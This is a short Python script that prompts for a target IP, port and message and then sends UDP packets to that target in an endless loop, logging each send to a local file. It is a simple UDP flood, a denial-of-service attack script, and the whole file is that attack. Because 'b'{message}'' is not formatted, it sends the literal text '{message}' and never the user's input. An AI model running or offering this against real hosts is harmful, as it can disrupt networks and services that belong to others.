import socket

# target_ip = "192.168.158.59"
target_ip = input("Enter the target IP Address: ")

target_port = int(input("Enter the port to be targetted: "))

message = input("Enter the message to be sent: ")

message = b'{message}'

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
while True:
    client.sendto(message, (target_ip, target_port))
    with open("requestsent.txt", 'a') as file:
        file.write("Request has been sent\n\r")